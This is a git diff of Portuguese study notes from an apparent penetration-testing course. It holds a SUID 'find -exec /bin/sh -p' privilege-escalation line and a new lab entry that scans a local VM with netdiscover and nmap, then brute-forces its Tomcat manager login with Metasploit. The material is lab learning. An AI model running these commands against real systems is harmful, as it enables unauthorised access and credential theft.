@@ -1,4 +1,4 @@
-# 23/02
+	# 23/02
 
 **informação** : dados que possuem algum valor ( financeiro, )
 **exploits**: códigos, dados ou sequencias de comandos criados para tirar vantagens de vulnerabilidades em softwares, hardwares ou sistemas permitindo ações não autorizadas como roubo de dados ou instalação de malwares.
@@ -503,3 +503,21 @@ find /etc/passwd -exec "whoami" \;
 find /etc/passwd -exec "/bin/sh" -p \;
 ```
 
+
+
+# 13/04
+
+Iniciamos a VM _thales_ com ela na mesma rede vboxnet, descobrimos o ip da VM usando: `sudo netdiscover -i vboxnet0 192.168.56.0/24`.
+
+Em seguida usamos o nmap para escanear todas (`-A`) as portas abertas:
+`sudo nmap -A 192.168.56.105` 
+
+E vamos explorar as portas abertas começando pelo tomcat...
+usaremos o `msfconsole` e pesquisaremos pelos exploits do Tomcat pesquisando `search Tomcat`
+
+Para usar forca bruta na porta do Tomcat usando o Payload  65 :
+`msf auxiliary(scanner/http/tomcat_mgr_login`
+ definiremos o: 
+ - RHOSTS - IP
+ - VERBOSE - true
+ - STOP_ON_SUCCCESS - true
